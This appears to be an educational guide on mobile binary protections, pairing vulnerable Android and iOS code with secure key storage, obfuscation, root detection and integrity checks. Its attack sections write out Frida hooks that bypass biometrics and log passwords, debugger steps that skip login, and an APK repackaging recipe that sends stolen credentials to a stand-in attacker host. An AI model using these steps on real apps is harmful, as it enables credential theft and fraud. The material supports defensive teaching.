# M07: Insufficient Binary Protections - Code Examples

## Table of Contents
1. [Introduction](#introduction)
2. [Vulnerable Examples](#vulnerable-examples)
3. [Secure Examples](#secure-examples)
4. [Common Vulnerable Patterns](#common-vulnerable-patterns)
5. [Secure Implementation Patterns](#secure-implementation-patterns)
6. [Framework-Specific Examples](#framework-specific-examples)
7. [Comparison Tables](#comparison-tables)

---

## Introduction

This document provides practical code examples demonstrating insufficient binary protections and their secure alternatives. Each example shows:
- ❌ **Vulnerable Code**: What NOT to do
- ✅ **Secure Code**: Recommended implementation
- **Why It's Vulnerable**: Explanation of the security risk
- **Attack Scenario**: How an attacker would exploit it
- **Risk Level**: Severity assessment

**⚠️ DISCLAIMER**: Vulnerable examples are for educational purposes only. Never use these patterns in production applications.

---

## Vulnerable Examples

### Example 1: Hardcoded API Keys

#### ❌ VULNERABLE: API Keys in Source Code

**Android (Kotlin):**
```kotlin
// ApiClient.kt - VULNERABLE
package com.company.app.network

object ApiClient {
    // VULNERABILITY: Hardcoded API keys
    private const val STRIPE_API_KEY = "sk_live_4eC39HqLyjWDarjtT1zdp7dc"
    private const val AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
    private const val AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    private const val API_BASE_URL = "https://api.company.com/v1/"
    
    fun makePayment(amount: Double): Boolean {
        val request = Request.Builder()
            .url("$API_BASE_URL/payments")
            .addHeader("Authorization", "Bearer $STRIPE_API_KEY")
            .post(createPaymentBody(amount))
            .build()
            
        // Process payment
        return true
    }
}
```

**iOS (Swift):**
```swift
// APIManager.swift - VULNERABLE
import Foundation

class APIManager {
    // VULNERABILITY: Hardcoded credentials
    private let stripeKey = "sk_live_4eC39HqLyjWDarjtT1zdp7dc"
    private let awsAccessKey = "AKIAIOSFODNN7EXAMPLE"
    private let awsSecretKey = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    private let baseURL = "https://api.company.com/v1/"
    
    func processPayment(amount: Double, completion: @escaping (Bool) -> Void) {
        var request = URLRequest(url: URL(string: "\(baseURL)payments")!)
        request.setValue("Bearer \(stripeKey)", forHTTPHeaderField: "Authorization")
        
        // Make request
        URLSession.shared.dataTask(with: request) { _, _, _ in
            completion(true)
        }.resume()
    }
}
```

**Why It's Vulnerable:**
- API keys visible in decompiled code (takes 2 minutes with jadx/Hopper)
- Simple string extraction reveals all secrets: `strings app.apk | grep "sk_live"`
- No obfuscation protects these values
- Keys can't be rotated without app update

**Attack Scenario:**
```bash
# Attacker's process (5 minutes total)
$ wget https://play.google.com/download/app.apk  # Download from device
$ strings app.apk | grep -E "(sk_live|AKIA)"     # Extract keys

Output:
sk_live_4eC39HqLyjWDarjtT1zdp7dc
AKIAIOSFODNN7EXAMPLE
wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Now attacker has full Stripe and AWS access
$ aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
$ aws s3 ls  # Access all S3 buckets
$ # Stripe API can be used for fraudulent charges
```

**Risk Level:** 🔴 CRITICAL  
**Impact:** Complete API compromise, unauthorized cloud resource usage, financial fraud

---

### Example 2: No Code Obfuscation

#### ❌ VULNERABLE: Readable Business Logic

**Android (Java):**
```java
// PremiumManager.java - VULNERABLE (No obfuscation)
package com.company.app.billing;

public class PremiumManager {
    
    private Context context;
    private static final String PREF_NAME = "premium_prefs";
    private static final String KEY_PREMIUM = "is_premium";
    
    public PremiumManager(Context context) {
        this.context = context;
    }
    
    // VULNERABILITY: Local premium check only
    public boolean isPremiumUser() {
        SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        return prefs.getBoolean(KEY_PREMIUM, false);
    }
    
    // VULNERABILITY: Easy to bypass
    public void unlockPremiumFeatures() {
        if (isPremiumUser()) {
            enableFeature("advanced_analytics");
            enableFeature("unlimited_exports");
            enableFeature("premium_templates");
        }
    }
    
    private void enableFeature(String featureName) {
        // Feature implementation
        Log.d("Premium", "Enabled feature: " + featureName);
    }
}
```

**Decompiled Code (What Attacker Sees):**
```java
// Identical to source code (no obfuscation)
package com.company.app.billing;

public class PremiumManager {
    // Attacker can immediately understand:
    // 1. Premium status stored in SharedPreferences
    // 2. Key is "is_premium"
    // 3. No server validation
    // 4. Can modify SharedPreferences to bypass
    
    public boolean isPremiumUser() {
        SharedPreferences prefs = this.context.getSharedPreferences("premium_prefs", 0);
        return prefs.getBoolean("is_premium", false);
    }
}
```

**Attack:**
```bash
# Method 1: Modify SharedPreferences directly (rooted device)
adb shell
su
cd /data/data/com.company.app/shared_prefs/
cat premium_prefs.xml

# Edit XML file:
<boolean name="is_premium" value="true" />

# Method 2: Frida hook (even without root)
frida -U -f com.company.app -l bypass.js

# bypass.js
Java.perform(function() {
    var PremiumManager = Java.use('com.company.app.billing.PremiumManager');
    PremiumManager.isPremiumUser.implementation = function() {
        return true;  // Always premium
    };
});
```

**Why It's Vulnerable:**
- Class, method, variable names are human-readable
- Business logic completely exposed
- Attack vector obvious (local SharedPreferences check)
- Takes attacker 10 minutes to bypass

**Risk Level:** 🔴 HIGH  
**Impact:** Revenue loss from bypassed premium features, easy piracy

---

### Example 3: Debuggable Production Build

#### ❌ VULNERABLE: Debug Mode Enabled

**AndroidManifest.xml:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.company.bankingapp">
    
    <!-- VULNERABILITY: Debuggable in production -->
    <application
        android:name=".BankingApplication"
        android:allowBackup="true"
        android:debuggable="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme">
        
        <activity android:name=".LoginActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <activity android:name=".TransferActivity" />
        <activity android:name=".BalanceActivity" />
    </application>
</manifest>
```

**build.gradle (also vulnerable):**
```groovy
android {
    buildTypes {
        release {
            // VULNERABILITY: Debugging enabled in release
            debuggable true
            minifyEnabled false  // No obfuscation
            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
        }
    }
}
```

**Attack:**
```bash
# Verify app is debuggable
adb shell dumpsys package com.company.bankingapp | grep debuggable
# Output: debuggable=true

# Enable debugging
adb shell am set-debug-app -w com.company.bankingapp

# Get PID
adb shell ps | grep bankingapp
# Output: u0_a123  12345  ...  com.company.bankingapp

# Attach debugger
adb forward tcp:8700 jdwp:12345
jdb -attach localhost:8700

# Inside debugger, set breakpoint on login
> stop in com.company.bankingapp.LoginActivity.validateCredentials
> run

# App executes, breakpoint hits
> locals
username = "victim@email.com"
password = "UserPassword123!"  // Credentials exposed!

# Modify authentication result
> set authenticated = true
> cont
# Logged in as victim without valid credentials!
```

**Why It's Vulnerable:**
- Allows real-time debugging of production app
- Can inspect all variables, including passwords and tokens
- Can modify execution flow (skip authentication)
- No skill required (Android Studio does everything)

**Risk Level:** 🔴 CRITICAL  
**Impact:** Complete application compromise, credential theft, authentication bypass

---

### Example 4: No Root/Jailbreak Detection

#### ❌ VULNERABLE: No Environment Checks

**Android (Kotlin):**
```kotlin
// MainActivity.kt - VULNERABLE
package com.company.bankingapp

class MainActivity : AppCompatActivity() {
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        // VULNERABILITY: No root detection
        // App runs normally on rooted devices
        // Frida, Xposed can hook any function
        
        initializeApp()
        loadUserData()
    }
    
    private fun initializeApp() {
        // Initialize banking features
        // No security checks whatsoever
    }
}
```

**iOS (Swift):**
```swift
// AppDelegate.swift - VULNERABLE
import UIKit

@UIApplicationMain
class AppDelegate: UIResponder, UIApplicationDelegate {
    
    var window: UIWindow?
    
    func application(_ application: UIApplication,
                     didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        // VULNERABILITY: No jailbreak detection
        // App runs on jailbroken devices
        // Cycript, Frida can manipulate app
        
        setupApp()
        return true
    }
}
```

**Attack on Rooted/Jailbroken Device:**
```bash
# Install Frida on rooted device
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# Bypass all security checks
frida -U -f com.company.bankingapp -l universal-bypass.js

# universal-bypass.js - Bypasses everything
Java.perform(function() {
    // Bypass biometric
    var BiometricManager = Java.use('com.company.bankingapp.BiometricManager');
    BiometricManager.authenticate.implementation = function() {
        console.log('[+] Biometric bypassed');
        this.onAuthSuccess();  // Force success
    };
    
    // Bypass transaction limits
    var TransferManager = Java.use('com.company.bankingapp.TransferManager');
    TransferManager.getTransferLimit.implementation = function() {
        return 999999999;  // Unlimited
    };
    
    // Log all sensitive data
    var LoginActivity = Java.use('com.company.bankingapp.LoginActivity');
    LoginActivity.login.implementation = function(user, pass) {
        console.log('[+] Username: ' + user);
        console.log('[+] Password: ' + pass);
        return this.login(user, pass);
    };
});
```

**Why It's Vulnerable:**
- No detection of compromised device environment
- Frida/Xposed can hook any function
- All app-level protections can be bypassed
- Certificate pinning can be disabled

**Risk Level:** 🔴 HIGH  
**Impact:** All security controls can be bypassed on rooted devices

---

### Example 5: No Integrity Verification

#### ❌ VULNERABLE: Missing Signature Checks

**Android (Kotlin):**
```kotlin
// Application.kt - VULNERABLE
package com.company.app

class MyApplication : Application() {
    
    override fun onCreate() {
        super.onCreate()
        
        // VULNERABILITY: No signature verification
        // App doesn't verify it hasn't been repackaged
        // Modified versions run without detection
        
        initializeApp()
    }
    
    private fun initializeApp() {
        // App initialization
        // Assumes this is the legitimate version
    }
}
```

**Attack - Repackaging:**
```bash
# Step 1: Decompile
apktool d original-bank-app.apk -o decompiled/

# Step 2: Inject malicious code
cd decompiled/smali/com/company/app/
nano LoginActivity.smali

# Add credential stealing code at login method
.method private login(Ljava/lang/String;Ljava/lang/String;)V
    # Original login code...
    
    # INJECTED: Send credentials to attacker
    const-string v0, "http://attacker.com/steal.php"
    # ... network code to send username/password ...
    
    # Continue with original login
.end method

# Step 3: Recompile
apktool b decompiled/ -o modified-bank-app.apk

# Step 4: Sign with debug key
jarsigner -keystore ~/.android/debug.keystore modified-bank-app.apk androiddebugkey

# Step 5: Distribute
# Upload to third-party store or send via phishing

# Result: App works perfectly, users can't tell difference
# But all credentials sent to attacker
```

**Why It's Vulnerable:**
- App doesn't verify its own signature
- Modified versions indistinguishable to users
- Malicious code injection goes undetected
- Can be distributed as "update" or "mod"

**Risk Level:** 🔴 CRITICAL  
**Impact:** Malware distribution, credential theft, brand damage

---

## Secure Examples

### Example 1: Secure Key Management

#### ✅ SECURE: Android KeyStore Implementation

```kotlin
// SecureKeyManager.kt - SECURE
package com.company.app.security

import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import java.security.KeyStore
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import android.util.Base64

object SecureKeyManager {
    
    private const val KEYSTORE_PROVIDER = "AndroidKeyStore"
    private const val KEY_ALIAS = "app_master_key"
    private const val TRANSFORMATION = "AES/GCM/NoPadding"
    private const val GCM_TAG_LENGTH = 128
    
    init {
        // Generate key on first run
        if (!keyExists()) {
            generateKey()
        }
    }
    
    /**
     * Generate AES key in Android KeyStore (hardware-backed if available)
     */
    private fun generateKey() {
        val keyGenerator = KeyGenerator.getInstance(
            KeyProperties.KEY_ALGORITHM_AES,
            KEYSTORE_PROVIDER
        )
        
        val builder = KeyGenParameterSpec.Builder(
            KEY_ALIAS,
            KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT
        )
            .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
            .setRandomizedEncryptionRequired(true)
            .setUserAuthenticationRequired(false)  // Set true for biometric protection
        
        keyGenerator.init(builder.build())
        keyGenerator.generateKey()
    }
    
    private fun keyExists(): Boolean {
        val keyStore = KeyStore.getInstance(KEYSTORE_PROVIDER)
        keyStore.load(null)
        return keyStore.containsAlias(KEY_ALIAS)
    }
    
    private fun getKey(): SecretKey {
        val keyStore = KeyStore.getInstance(KEYSTORE_PROVIDER)
        keyStore.load(null)
        return keyStore.getKey(KEY_ALIAS, null) as SecretKey
    }
    
    /**
     * Encrypt sensitive data
     * @return Base64-encoded "IV:Ciphertext"
     */
    fun encrypt(plaintext: String): String {
        val cipher = Cipher.getInstance(TRANSFORMATION)
        cipher.init(Cipher.ENCRYPT_MODE, getKey())
        
        val iv = cipher.iv
        val ciphertext = cipher.doFinal(plaintext.toByteArray(Charsets.UTF_8))
        
        // Combine IV and ciphertext
        val combined = iv + ciphertext
        return Base64.encodeToString(combined, Base64.NO_WRAP)
    }
    
    /**
     * Decrypt sensitive data
     */
    fun decrypt(encrypted: String): String {
        val combined = Base64.decode(encrypted, Base64.NO_WRAP)
        
        // Extract IV and ciphertext
        val iv = combined.copyOfRange(0, 12)  // GCM IV is 12 bytes
        val ciphertext = combined.copyOfRange(12, combined.size)
        
        val cipher = Cipher.getInstance(TRANSFORMATION)
        val spec = GCMParameterSpec(GCM_TAG_LENGTH, iv)
        cipher.init(Cipher.DECRYPT_MODE, getKey(), spec)
        
        val plaintext = cipher.doFinal(ciphertext)
        return String(plaintext, Charsets.UTF_8)
    }
}

// Usage: Secure API key storage
object ApiClient {
    private const val ENCRYPTED_API_KEY_PREF = "enc_api_key"
    
    /**
     * Store API key securely (called once, key from server)
     */
    fun storeApiKey(context: Context, apiKey: String) {
        val encrypted = SecureKeyManager.encrypt(apiKey)
        context.getSharedPreferences("secure_prefs", Context.MODE_PRIVATE)
            .edit()
            .putString(ENCRYPTED_API_KEY_PREF, encrypted)
            .apply()
    }
    
    /**
     * Retrieve and decrypt API key when needed
     */
    private fun getApiKey(context: Context): String {
        val encrypted = context.getSharedPreferences("secure_prefs", Context.MODE_PRIVATE)
            .getString(ENCRYPTED_API_KEY_PREF, null)
            ?: throw IllegalStateException("API key not found")
        
        return SecureKeyManager.decrypt(encrypted)
    }
    
    fun makeSecureRequest(context: Context) {
        val apiKey = getApiKey(context)
        
        // Use API key for request
        val request = Request.Builder()
            .url("https://api.company.com/data")
            .addHeader("Authorization", "Bearer $apiKey")
            .build()
        
        // Make request (key used temporarily, not stored in memory)
    }
}
```

**Benefits:**
- ✅ API key never in source code
- ✅ Encrypted at rest using hardware-backed key (if available)
- ✅ Key stored in Android KeyStore (can't be extracted)
- ✅ Even with root access, key material protected
- ✅ Can require biometric auth to decrypt (set userAuthenticationRequired = true)

#### ✅ SECURE: iOS Keychain Implementation

```swift
// KeychainManager.swift - SECURE
import Foundation
import Security

enum KeychainError: Error {
    case duplicateEntry
    case unknown(OSStatus)
    case notFound
}

class KeychainManager {
    
    static let shared = KeychainManager()
    private init() {}
    
    /**
     * Save sensitive data to Keychain with secure attributes
     */
    func save(_ data: Data, forKey key: String) throws {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key,
            kSecValueData as String: data,
            // SECURITY: Only accessible when device unlocked
            kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
        ]
        
        // Delete existing entry
        SecItemDelete(query as CFDictionary)
        
        // Add new entry
        let status = SecItemAdd(query as CFDictionary, nil)
        
        guard status == errSecSuccess else {
            throw KeychainError.unknown(status)
        }
    }
    
    /**
     * Retrieve from Keychain
     */
    func load(forKey key: String) throws -> Data {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne
        ]
        
        var result: AnyObject?
        let status = SecItemCopyMatching(query as CFDictionary, &result)
        
        guard status == errSecSuccess else {
            throw KeychainError.notFound
        }
        
        guard let data = result as? Data else {
            throw KeychainError.unknown(status)
        }
        
        return data
    }
    
    /**
     * Delete from Keychain
     */
    func delete(forKey key: String) throws {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key
        ]
        
        let status = SecItemDelete(query as CFDictionary)
        
        guard status == errSecSuccess || status == errSecItemNotFound else {
            throw KeychainError.unknown(status)
        }
    }
}

// Extension for String storage
extension KeychainManager {
    func save(_ string: String, forKey key: String) throws {
        guard let data = string.data(using: .utf8) else {
            throw KeychainError.unknown(errSecParam)
        }
        try save(data, forKey: key)
    }
    
    func loadString(forKey key: String) throws -> String {
        let data = try load(forKey: key)
        guard let string = String(data: data, encoding: .utf8) else {
            throw KeychainError.unknown(errSecParam)
        }
        return string
    }
}

// Usage: Secure API Client
class APIManager {
    
    static let shared = APIManager()
    private let apiKeyKey = "api_key"
    
    /**
     * Store API key securely (from server after auth)
     */
    func storeAPIKey(_ key: String) {
        do {
            try KeychainManager.shared.save(key, forKey: apiKeyKey)
            print("API key stored securely")
        } catch {
            print("Failed to store API key: \(error)")
        }
    }
    
    /**
     * Make secure API call
     */
    func fetchData(completion: @escaping (Result<Data, Error>) -> Void) {
        // Retrieve API key from Keychain
        guard let apiKey = try? KeychainManager.shared.loadString(forKey: apiKeyKey) else {
            completion(.failure(NSError(domain: "API", code: -1, userInfo: [NSLocalizedDescriptionKey: "API key not found"])))
            return
        }
        
        // Use API key for request
        var request = URLRequest(url: URL(string: "https://api.company.com/data")!)
        request.setValue("Bearer \(apiKey)", forHTTPHeaderField: "Authorization")
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                completion(.failure(error))
                return
            }
            
            completion(.success(data ?? Data()))
        }.resume()
    }
}
```

**Benefits:**
- ✅ No hardcoded keys in source
- ✅ Keychain encrypted with device hardware key
- ✅ Data only accessible when device unlocked
- ✅ Survives app uninstall/reinstall
- ✅ Secure enclave protection (newer devices)

---

### Example 2: Code Obfuscation with ProGuard

#### ✅ SECURE: Properly Configured Obfuscation

**proguard-rules.pro:**
```properties
# ==============================================================================
# SECURITY-FOCUSED PROGUARD CONFIGURATION
# ==============================================================================

# Optimization settings
-optimizationpasses 5
-optimizations !code/simplification/arithmetic,!field/*,!class/merging/*
-allowaccessmodification
-verbose

# Obfuscation settings
-repackageclasses ''
-dontusemixedcaseclassnames
-keepattributes *Annotation*
-flattenpackagehierarchy 'obf'
-overloadaggressively

# ==============================================================================
# REMOVE DEBUG CODE
# ==============================================================================

# Remove all logging
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

# Remove BuildConfig debug flags
-assumenosideeffects class **.BuildConfig {
    public static final boolean DEBUG return false;
}

# ==============================================================================
# SECURITY-CRITICAL CLASSES - HEAVY OBFUSCATION
# ==============================================================================

# Obfuscate entire security package
-keep class com.company.app.security.** { *; }
-keepclassmembers class com.company.app.security.** {
    !private <fields>;
    !private <methods>;
}

# Obfuscate payment processing
-keep class com.company.app.payment.** { *; }

# Obfuscate premium/license checks
-keep class com.company.app.premium.** { *; }

# ==============================================================================
# KEEP NECESSARY CLASSES (Don't obfuscate)
# ==============================================================================

# Keep Application class
-keep public class * extends android.app.Application

# Keep Activities, Services, etc. (referenced in manifest)
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider

# Keep view constructors (used by XML layouts)
-keepclassmembers class * extends android.view.View {
    public <init>(android.content.Context);
    public <init>(android.content.Context, android.util.AttributeSet);
    public <init>(android.content.Context, android.util.AttributeSet, int);
}

# ==============================================================================
# LIBRARY COMPATIBILITY
# ==============================================================================

# Retrofit
-keepattributes Signature
-keepattributes Exceptions
-keep class retrofit2.** { *; }

# Gson
-keep class com.google.gson.** { *; }
-keep class * implements com.google.gson.TypeAdapterFactory
-keep class * implements com.google.gson.JsonSerializer
-keep class * implements com.google.gson.JsonDeserializer

# OkHttp
-keep class okhttp3.** { *; }
-keep interface okhttp3.** { *; }
```

**build.gradle:**
```groovy
android {
    buildTypes {
        release {
            // Enable obfuscation
            minifyEnabled true
            shrinkResources true
            
            // Use optimized ProGuard config
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 
                          'proguard-rules.pro'
            
            // Disable debugging
            debuggable false
            jniDebuggable false
            renderscriptDebuggable false
            
            // Remove default permissions
            manifestPlaceholders = [usesCleartextTraffic: "false"]
        }
    }
    
    // Split APKs (makes analysis harder)
    splits {
        abi {
            enable true
            reset()
            include 'armeabi-v7a', 'arm64-v8a'
            universalApk false
        }
    }
}
```

**Before Obfuscation:**
```java
package com.company.app.premium;

public class PremiumValidator {
    private static final String TAG = "PremiumValidator";
    
    public boolean validatePremiumStatus(String userId) {
        Log.d(TAG, "Validating premium for user: " + userId);
        SharedPreferences prefs = getSharedPreferences("premium", MODE_PRIVATE);
        boolean isPremium = prefs.getBoolean("premium_status", false);
        Log.d(TAG, "Premium status: " + isPremium);
        return isPremium;
    }
}
```

**After Obfuscation (What attacker sees):**
```java
package obf;

public class a {
    // All logs removed
    // Class name: a
    // Method name: b
    // Variable names: c, d, e
    
    public boolean b(String c) {
        d e = f("p", 0);  // "premium" → "p"
        return e.g("s", false);  // "premium_status" → "s"
    }
}
```

**Benefits:**
- ✅ Class/method/variable names meaningless
- ✅ All debug logs removed (no sensitive data exposure)
- ✅ Code structure harder to understand
- ✅ Time to reverse engineer increased from minutes to hours
- ✅ Automated tools less effective

---

### Example 3: Comprehensive Root/Jailbreak Detection

#### ✅ SECURE: Multi-Method Detection (Android)

```kotlin
// RootDetector.kt - SECURE
package com.company.app.security

import android.content.Context
import android.content.pm.PackageManager
import java.io.File

object RootDetector {
    
    /**
     * Comprehensive root detection using multiple methods
     * Returns true if device appears to be rooted
     */
    fun isDeviceRooted(context: Context): Boolean {
        return checkSuBinary() ||
               checkRootApps(context) ||
               checkRWPaths() ||
               checkDangerousProps() ||
               checkBuildTags() ||
               canExecuteSu()
    }
    
    /**
     * Method 1: Check for su binary in common locations
     */
    private fun checkSuBinary(): Boolean {
        val suPaths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su",
            "/su/bin",
            "/system/xbin/which"
        )
        
        return suPaths.any { File(it).exists() }
    }
    
    /**
     * Method 2: Check for root management apps
     */
    private fun checkRootApps(context: Context): Boolean {
        val rootPackages = arrayOf(
            "com.topjohnwu.magisk",              // Magisk
            "com.noshufou.android.su",           // Superuser
            "com.noshufou.android.su.elite",     // Superuser Elite
            "eu.chainfire.supersu",              // SuperSU
            "com.koushikdutta.superuser",        // Koushik Superuser
            "com.thirdparty.superuser",          // Third-party Superuser
            "com.yellowes.su",                   // YellowES
            "com.koushikdutta.rommanager",       // ROM Manager
            "com.koushikdutta.rommanager.license", // ROM Manager Premium
            "com.dimonvideo.luckypatcher",       // Lucky Patcher
            "com.chelpus.lackypatch",            // Lucky Patcher variant
            "com.ramdroid.appquarantine"         // App Quarantine
        )
        
        val pm = context.packageManager
        return rootPackages.any {
            try {
                pm.getPackageInfo(it, 0)
                true
            } catch (e: PackageManager.NameNotFoundException) {
                false
            }
        }
    }
    
    /**
     * Method 3: Check if system directories are writable
     */
    private fun checkRWPaths(): Boolean {
        val paths = arrayOf(
            "/system",
            "/system/bin",
            "/system/sbin",
            "/system/xbin",
            "/vendor/bin",
            "/sbin",
            "/etc"
        )
        
        return paths.any { path ->
            val file = File(path)
            file.exists() && file.canWrite()
        }
    }
    
    /**
     * Method 4: Check for dangerous system properties
     */
    private fun checkDangerousProps(): Boolean {
        val props = arrayOf(
            "ro.debuggable" to "1",
            "ro.secure" to "0"
        )
        
        return props.any { (key, dangerousValue) ->
            getProp(key) == dangerousValue
        }
    }
    
    private fun getProp(property: String): String? {
        return try {
            val process = Runtime.getRuntime().exec("getprop $property")
            process.inputStream.bufferedReader().readLine()
        } catch (e: Exception) {
            null
        }
    }
    
    /**
     * Method 5: Check build tags (test-keys = custom ROM)
     */
    private fun checkBuildTags(): Boolean {
        val tags = android.os.Build.TAGS
        return tags != null && tags.contains("test-keys")
    }
    
    /**
     * Method 6: Try to execute su command
     */
    private fun canExecuteSu(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
            val result = process.waitFor()
            result == 0
        } catch (e: Exception) {
            false
        }
    }
    
    /**
     * Use Google SafetyNet for comprehensive check (recommended)
     */
    fun checkWithSafetyNet(context: Context, apiKey: String, callback: (Boolean) -> Unit) {
        // Requires: implementation 'com.google.android.gms:play-services-safetynet:18.0.1'
        
        val client = SafetyNet.getClient(context)
        val nonce = ByteArray(24).apply { 
            java.security.SecureRandom().nextBytes(this)
        }
        
        client.attest(nonce, apiKey)
            .addOnSuccessListener { response ->
                // Parse JWS result
                val jwsResult = response.jwsResult
                // Verify signature and check basicIntegrity and ctsProfileMatch
                val isDeviceSafe = parseJwtAndValidate(jwsResult, apiKey)
                callback(isDeviceSafe)
            }
            .addOnFailureListener { exception ->
                // SafetyNet check failed - assume compromised
                callback(false)
            }
    }
    
    private fun parseJwtAndValidate(jwt: String, apiKey: String): Boolean {
        // Implement JWT parsing and validation
        // Check basicIntegrity and ctsProfileMatch fields
        // Return true only if both pass
        return false  // Simplified for example
    }
}

// Usage in Application or MainActivity
class SecureApplication : Application() {
    override fun onCreate() {
        super.onCreate()
        
        // Check for root
        if (RootDetector.isDeviceRooted(this)) {
            handleRootedDevice()
        }
        
        // Also check with SafetyNet (more reliable)
        RootDetector.checkWithSafetyNet(this, "YOUR_API_KEY") { isDeviceSafe ->
            if (!isDeviceSafe) {
                handleCompromisedDevice()
            }
        }
    }
    
    private fun handleRootedDevice() {
        // Option 1: Show warning and continue
        showRootWarning()
        
        // Option 2: Disable sensitive features
        disableSensitiveFeatures()
        
        // Option 3: Exit app (harsh but sometimes necessary)
        // android.os.Process.killProcess(android.os.Process.myPid())
    }
}
```

**Benefits:**
- ✅ Multiple detection methods (harder to bypass all)
- ✅ SafetyNet integration (Google's device integrity API)
- ✅ Detects root management apps
- ✅ Checks file system integrity
- ✅ Graceful degradation (warning vs exit)

---

### Example 4: Signature Verification and Integrity Checks

#### ✅ SECURE: Runtime Integrity Verification

```kotlin
// IntegrityChecker.kt - SECURE
package com.company.app.security

import android.content.Context
import android.content.pm.PackageManager
import android.content.pm.Signature
import java.security.MessageDigest
import java.util.zip.CRC32

object IntegrityChecker {
    
    // Expected signature SHA-256 hash (from your release keystore)
    // Get this by signing release build and calculating hash
    private const val EXPECTED_SIGNATURE_HASH = 
        "a1b2c3d4e5f6789012345678901234567890123456789012345678901234567"
    
    /**
     * Verify app hasn't been repackaged with different signature
     * Call this in Application.onCreate()
     */
    fun verifyAppSignature(context: Context): Boolean {
        return try {
            val packageInfo = context.packageManager.getPackageInfo(
                context.packageName,
                PackageManager.GET_SIGNATURES
            )
            
            for (signature in packageInfo.signatures) {
                val hash = calculateSignatureHash(signature)
                
                if (hash == EXPECTED_SIGNATURE_HASH) {
                    return true  // Legitimate signature
                }
            }
            
            false  // Signature doesn't match = repackaged
        } catch (e: Exception) {
            false  // Assume compromised if check fails
        }
    }
    
    private fun calculateSignatureHash(signature: Signature): String {
        val md = MessageDigest.getInstance("SHA-256")
        md.update(signature.toByteArray())
        return bytesToHex(md.digest())
    }
    
    /**
     * Verify APK file integrity
     * Detects if APK has been modified
     */
    fun verifyApkIntegrity(context: Context): Boolean {
        return try {
            val apkPath = context.packageCodePath
            val currentChecksum = calculateApkChecksum(apkPath)
            
            // Compare with expected checksum
            // Store expected checksum securely (obfuscated in native code or fetched from server)
            val expectedChecksum = getExpectedChecksum()
            
            currentChecksum == expectedChecksum
        } catch (e: Exception) {
            false
        }
    }
    
    private fun calculateApkChecksum(apkPath: String): Long {
        val file = File(apkPath)
        val crc = CRC32()
        
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var bytesRead = input.read(buffer)
            while (bytesRead != -1) {
                crc.update(buffer, 0, bytesRead)
                bytesRead = input.read(buffer)
            }
        }
        
        return crc.value
    }
    
    /**
     * Verify classes.dex integrity
     * Detects if code has been modified
     */
    fun verifyDexIntegrity(context: Context): Boolean {
        return try {
            // Calculate current DEX checksum
            val currentChecksum = calculateDexChecksum(context)
            
            // Compare with expected
            val expectedChecksum = getExpectedDexChecksum()
            
            currentChecksum == expectedChecksum
        } catch (e: Exception) {
            false
        }
    }
    
    private fun calculateDexChecksum(context: Context): Long {
        val apkPath = context.applicationInfo.sourceDir
        var checksum: Long = 0
        
        java.util.zip.ZipFile(apkPath).use { zip ->
            val entry = zip.getEntry("classes.dex")
            zip.getInputStream(entry).use { input ->
                val crc = CRC32()
                val buffer = ByteArray(8192)
                var read = input.read(buffer)
                while (read != -1) {
                    crc.update(buffer, 0, read)
                    read = input.read(buffer)
                }
                checksum = crc.value
            }
        }
        
        return checksum
    }
    
    // These would be obfuscated in native code or fetched from server
    private external fun getExpectedChecksum(): Long
    private external fun getExpectedDexChecksum(): Long
    
    private fun bytesToHex(bytes: ByteArray): String {
        return bytes.joinToString("") { "%02x".format(it) }
    }
    
    /**
     * Continuous integrity monitoring
     * Runs checks periodically in background
     */
    fun startContinuousMonitoring(context: Context) {
        Thread {
            while (true) {
                // Check signature
                if (!verifyAppSignature(context)) {
                    handleTampering("Signature verification failed")
                }
                
                // Check APK integrity
                if (!verifyApkIntegrity(context)) {
                    handleTampering("APK integrity check failed")
                }
                
                // Check DEX integrity
